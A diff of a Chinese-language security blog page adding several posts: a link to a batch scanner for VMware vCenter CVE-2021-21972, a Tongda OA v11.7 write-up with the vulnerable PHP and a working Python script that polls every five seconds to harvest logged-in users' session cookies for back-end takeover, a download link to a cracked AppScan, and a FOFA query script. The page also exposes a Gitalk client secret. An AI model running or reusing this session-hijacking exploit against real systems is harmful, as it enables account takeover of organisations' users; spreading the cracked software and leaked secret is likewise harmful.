@@ -66,6 +66,334 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CVE-2021-21972" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/03/07/CVE-2021-21972/" class="article-date">
+  <time datetime="2021-03-07T13:56:13.000Z" itemprop="datePublished">2021-03-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/07/CVE-2021-21972/">CVE-2021-21972</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#CVE-2021-21972 Vmware vCenter 图形化POC批量扫描工具<br>#工具界面：</p>
+<p><img src="https://secquan.zzyuncheng.com/372e9c3767d8cdd422e9b022dc40d5d3.png-quanzi" alt="enter image description here"></p>
+<p>（直接把.txt文件拖入进去就可以。。。）<br>###下载地址：<br><a target="_blank" rel="noopener" href="https://github.com/admin360bug/GUI-POC-EXP/#">https://github.com/admin360bug/GUI-POC-EXP/#</a><br>###关于EXP：<br>已编译完成，脱离python环境可用的工具<br><img src="https://secquan.zzyuncheng.com/67a5e99feb59ada76a80e353786c75b8.png-quanzi" alt="enter image description here"></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2021/03/07/CVE-2021-21972/" data-id="ckmogaiis0005aacpci8ue7u7" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="通达OAv11.7在线用户登录漏洞-通达OA登录漏洞" class="article article-type-通达OAv11.7在线用户登录漏洞" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/03/07/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2021-03-07T13:54:15.000Z" itemprop="datePublished">2021-03-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/07/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/">通达OAv11.7在线用户登录漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#通达OA v11.7 在线用户登录漏洞<br>###漏洞描述<br>通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统<br>###漏洞影响<br>通达OA &lt; v11.7</p>
+<p>###环境搭建<br><a target="_blank" rel="noopener" href="https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe">https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe</a><br>下载后按步骤安装即可<br>###漏洞复现<br>漏洞有关文件 MYOA\webroot\mobile\auth_mobi.php</p>
+<pre>
+<?php
+
+function relogin()
+{
+    echo _('RELOGIN');
+    exit;
+}
+ob_start();
+include_once 'inc/session.php';
+include_once 'inc/conn.php';
+include_once 'inc/utility.php';
+if ($isAvatar == '1' && $uid != '' && $P_VER != '') {
+    $sql = 'SELECT SID FROM user_online WHERE UID = \'' . $uid . '\' and CLIENT = \'' . $P_VER . '\'';
+    $cursor = exequery(TD::conn(), $sql);
+    if ($row = mysql_fetch_array($cursor)) {
+        $P = $row['SID'];
+    }
+}
+if ($P == '') {
+    $P = $_COOKIE['PHPSESSID'];
+    if ($P == '') {
+        relogin();
+        exit;
+    }
+}
+if (preg_match('/[^a-z0-9;]+/i', $P)) {
+    echo _('非法参数');
+    exit;
+}
+if (strpos($P, ';') !== false) {
+    $MY_ARRAY = explode(';', $P);
+    $P = trim($MY_ARRAY[1]);
+}
+session_id($P);
+session_start();
+session_write_close();
+if ($_SESSION['LOGIN_USER_ID'] == '' || $_SESSION['LOGIN_UID'] == '') {
+    relogin();
+}
+
+</pre>
+
+<p>在执行的 SQL语句中</p>
+<pre>
+$sql = 'SELECT SID FROM user_online WHERE UID = \'' . $uid . '\' and CLIENT = \'' . $P_VER . '\'';
+</pre>
+
+<p><img src="https://secquan.zzyuncheng.com/d8eb572842b6fd6850e1509fd8633117.png-quanzi" alt="enter image description here"></p>
+<p>简单阅读PHP源码可以知道 此SQL语句会查询用户是否在线，如在线返回此用户 Session ID</p>
+<p><img src="https://secquan.zzyuncheng.com/79bd0e09ddbcdd8284b73f61843ddbb5.png-quanzi" alt="enter image description here"></p>
+<p>将返回的 Set-Cookie 中的Cookie参数值使用于登录Cookie</p>
+<p>访问目标后台 <a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/general/">http://xxx.xxx.xxx.xxx/general/</a></p>
+<p><img src="https://secquan.zzyuncheng.com/8037005f77edcd7efaa6f6ff14079cad.png-quanzi" alt="enter image description here"></p>
+<p>当目标离线时则访问漏洞页面则会出现如下图</p>
+<p><img src="https://secquan.zzyuncheng.com/e22feccb1e36f1ea9ecb8f6ab71b4154.png-quanzi" alt="enter image description here"><br>通过此思路可以持续发包监控此页面来获取在线用户的Cookie</p>
+<p>###漏洞利用POC<br>5秒一次测试用户是否在线</p>
+<pre>
+import requests
+import sys
+import random
+import re
+import time
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+def title():
+    print('+------------------------------------------')
+    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
+    print('+  \033[34mVersion: 通达OA 11.7                                               \033[0m')
+    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
+    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
+    print('+------------------------------------------')
+
+def POC_1(target_url):
+    vuln_url = target_url + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+    }
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
+        if "RELOGIN" in response.text and response.status_code == 200:
+            print("\033[31m[x] 目标用户为下线状态 --- {}\033[0m".format(time.asctime( time.localtime(time.time()))))
+        elif response.status_code == 200 and response.text == "":
+            PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(response.headers))
+            print("\033[32m[o] 用户上线 PHPSESSION: {} --- {}\033[0m".format(PHPSESSION[0] ,time.asctime(time.localtime(time.time()))))
+        else:
+            print("\033[31m[x] 请求失败，目标可能不存在漏洞")
+            sys.exit(0)
+    except Exception as e:
+        print("\033[31m[x] 请求失败 \033[0m", e)
+
+if __name__ == '__main__':
+    title()
+    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
+    while True:
+        POC_1(target_url)
+        time.sleep(5)
+
+</pre>
+
+<p><img src="https://secquan.zzyuncheng.com/e4869ec095aec3c2d5df64cb968055a6.png-quanzi" alt="enter image description here"></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2021/03/07/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" data-id="ckmogaiiz000eaacp8m1r08y1" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Appscan-10-0-4破解版" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/03/07/Appscan-10-0-4%E7%A0%B4%E8%A7%A3%E7%89%88/" class="article-date">
+  <time datetime="2021-03-07T13:47:41.000Z" itemprop="datePublished">2021-03-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/07/Appscan-10-0-4%E7%A0%B4%E8%A7%A3%E7%89%88/">Appscan_10.0.4破解版</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#AppScan_10.0.4破解版<br><img src="https://secquan.zzyuncheng.com/218a1034bd504945b8b17c1abe4dd68e.png-quanzi" alt="enter image description here"></p>
+<p><img src="https://secquan.zzyuncheng.com/ea06c78478c8ba634ecc19ceb3b813fd.png-quanzi" alt="enter image description here"></p>
+<p><img src="https://secquan.zzyuncheng.com/d94ba970056c21ce3472870dc90c2b5f.png-quanzi" alt="enter image description here"></p>
+<p>链接：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1RarULLWDgijG3E1_KKMUBw">https://pan.baidu.com/s/1RarULLWDgijG3E1_KKMUBw</a><br>提取码：53g8</p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2021/03/07/Appscan-10-0-4%E7%A0%B4%E8%A7%A3%E7%89%88/" data-id="ckmogaiik0000aacp484u40t0" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-foha" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/01/30/foha/" class="article-date">
+  <time datetime="2021-01-30T09:05:49.000Z" itemprop="datePublished">2021-01-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/30/foha/">foha批量查询脚本</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#分享一下fofa的批量查询脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!&#x2F;usr&#x2F;bin&#x2F;python3<br># -*- coding: utf-8 -*-<br># Author  : 诚默<br><br>import base64<br>import json<br>import time<br>import pandas as pd<br>import requests<br>fofa_mail &#x3D; &#39;&#39;#通过fofa个人资料中获取<br>fofa_key &#x3D; &#39;&#39;#<br>fofa_list &#x3D; [&#39;title&#39;, &#39;header&#39;, &#39;body&#39;, &#39;domain&#39;, &#39;icon_hash&#39;, &#39;host&#39;, &#39;port&#39;, &#39;ip&#39;, &#39;status_code&#39;, &#39;protocol&#39;, &#39;city&#39;,<br>             &#39;region&#39;, &#39;country&#39;, &#39;cert&#39;, &#39;banner&#39;, &#39;typ&#39;, &#39;os&#39;, &#39;server&#39;, &#39;app&#39;, &#39;after&#39;, &#39;asn&#39;, &#39;org&#39;,<br>             &#39;base_protocol&#39;,<br>             &#39;is_ipv6&#39;, &#39;is_domain&#39;, &#39;ip_ports&#39;, &#39;port_size&#39;, &#39;port_size_gt&#39;, &#39;port_size_lt&#39;, &#39;ip_country&#39;, &#39;ip_region&#39;,<br>             &#39;ip_city&#39;, &#39;ip_after&#39;, &#39;ip_before&#39;<br>             ]<br><br>def fofaapi(select):  # 进行调用<br>    page &#x3D; 1  # 爬取几页数据，size为每页个数<br>    size &#x3D; 10  # 高级会员最大爬取前10000个<br>    fields &#x3D; &quot;host,ip,port,title,country_name&quot;  # 返回的数据列<br>    full &#x3D; &#39;false&#39;  # 显示所有的数据，false显示当年的<br>    base64_str &#x3D; base64.b64encode(select.encode(&quot;utf-8&quot;)).decode(&#39;utf-8&#39;)<br>    api_url &#x3D; &#39;https:&#x2F;&#x2F;fofa.so&#x2F;api&#x2F;v1&#x2F;search&#x2F;all?email&#x3D;&#39; + fofa_mail + &#39;&amp;key&#x3D;&#39; + fofa_key + &#39;&amp;qbase64&#x3D;&#39; + base64_str + &#39;&amp;fields&#x3D;&#39; + fields + &#39;&amp;size&#x3D;&#39; + str(<br>        size) + &#39;&amp;page&#x3D;&#39; + str(page) + &#39;&amp;full&#x3D;&#39; + full<br>    r &#x3D; requests.get(api_url)  # 提交请求<br>    text &#x3D; json.loads(r.text.encode(&#39;gbk&#39;, &#39;ignore&#39;).decode(&#39;gbk&#39;))  # 获得dict数据<br>    print(text)<br><br>    # 后续为写入表<br>    columns &#x3D; fields.split(&#39;,&#39;)  # 数据列名<br>    excel_list &#x3D; text[&#39;results&#39;]<br>    excel_list.insert(0, [&quot;查询语句：&quot; + str(select) + &quot; 页数：&quot; + str(page) + &quot; 每页：&quot; + str(size)])  # 写入初始的查询语句<br>    dt &#x3D; pd.DataFrame(excel_list, columns&#x3D;columns)<br>    file &#x3D; &#39;fofa&#39; + time.strftime(&#39;%Y%m%d%H%M%S&#39;, time.localtime(time.time()))  # 文件名为fofa+时间<br>    dt.to_excel(file + &quot;.xlsx&quot;, index&#x3D;1, engine&#x3D;&#39;xlsxwriter&#39;)<br>    #return text<br><br>def getselect(str):#格式化<br>    select &#x3D; &quot;&quot;<br>    comma_list &#x3D; str.split(&#39;,&#39;)  # 以逗号分组 （ip&#x3D;1.1.1.1 | domain&#x3D;baidu.com）<br>    for item in comma_list:<br>        equal_list &#x3D; item.split(&#39;&#x3D;&#39;)  # 等号分组 ip | 1.1.1.1<br>        if equal_list[0] in fofa_list:  # 属性存在，等号合规<br>            select +&#x3D; item + &quot; &amp;&amp; &quot;<br>        else:<br>            return False<br>    return select.rstrip(&#39; &amp;&amp; &#39;)  # 去除多余符号<br><br>def main():<br>    str &#x3D; &quot;domain&#x3D;baidu.com&quot;<br>    str1 &#x3D; &quot;ip&#x3D;61.135.186.217,domain&#x3D;baidu.com&quot;<br><br>    if getselect(str1) !&#x3D; False:  # 进行数据处理，数据合规就进行下一步操作<br>        fofaapi(getselect(str1))<br><br>if __name__ &#x3D;&#x3D; &#39;__main__&#39;:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<p>文件结果如下，可根据需求改动</p>
+<p><img src="https://secquan.zzyuncheng.com/0af6daa12bfe973d7c6d797eadc02bb3.png-quanzi" alt="enter image description here"></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2021/01/30/foha/" data-id="ckmogaiiv0009aacp8d8ycykq" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/01/30/xss/" class="article-date">
@@ -502,23 +830,23 @@ gitalk.render('gitalk-container')
       <ul>
         
           <li>
+            <a href="/2022/11/29/anydesk%E8%BF%9B%E8%A1%8C%E8%BF%9C%E6%8E%A7/">anydesk进行远控</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/29/Struts2%E6%BC%8F%E6%B4%9E/">Struts2漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/29/wifi%E6%9D%80%E6%89%8B%E7%BB%88%E6%9E%81%E7%89%88oled%E6%98%BE%E7%A4%BA/">wifi杀手终极版oled显示</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/29/c%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80%E5%8A%A0%E8%BD%BD%E5%99%A8/">c语言免杀加载器</a>
+          </li>
+        
+          <li>
             <a href="/2022/11/28/%E6%A0%A1%E5%9B%AD%E7%83%AD%E6%B0%B4%E5%8D%A1%E7%A0%B4%E8%A7%A3/">校园热水卡破解.md</a>
-          </li>
-        
-          <li>
-            <a href="/2022/11/27/%E5%AE%89%E5%8D%93%E8%BF%9C%E6%8E%A7/">安卓远控.md</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/12/%E6%A0%A1%E5%9B%AD%E7%BD%91udp53%E7%AB%AF%E5%8F%A3%E7%A0%B4%E8%A7%A3%E5%85%8D%E8%AE%A4%E8%AF%81/">校园网udp53端口破解免认证</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/17/MFC%E7%A4%BE%E5%B7%A5%E5%88%A9%E5%99%A8/">MFC社工利器</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/17/esp8266+blinker%E7%9A%84app+%E5%B0%8F%E7%88%B1%E5%90%8C%E5%AD%A6%E6%8E%A7%E5%88%B64%E5%88%B08%E4%B8%AA%E8%AE%BE%E5%A4%87%E6%BA%90%E7%A0%81/">esp8266+blinker+小爱同学控制4到8个设备源码</a>
           </li>
         
       </ul>
